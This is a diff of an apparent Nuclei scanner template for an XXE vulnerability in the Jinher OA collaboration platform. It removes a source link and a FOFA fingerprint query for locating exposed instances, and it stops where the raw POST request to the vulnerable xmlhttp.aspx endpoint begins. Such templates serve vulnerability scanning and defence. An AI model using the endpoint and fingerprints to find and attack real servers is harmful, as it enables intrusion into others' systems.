@@ -3,12 +3,8 @@ info:
   name: 金和OA JHSoft.Web.H5SiteControl xmlhttp.aspx 存在XXE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bxyirqg43v6130dg'
+  description: ''
   tags: xxe,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: bxyirqg43v6130dg
-    fofa: title="金和协同管理平台" || body="js/PasswordCommon.js" || body="js/PasswordNew.js" || body="Jinher Network" || (body="c6/Jhsoft.Web.login" && body="CloseWindowNoAsk") || header="Path=/jc6" || (body="JC6金和协同管
 http:
 - raw:
   - 'POST /c6/JHSoft.Web.H5SiteControl/xmlhttp.aspx/ HTTP/1.1
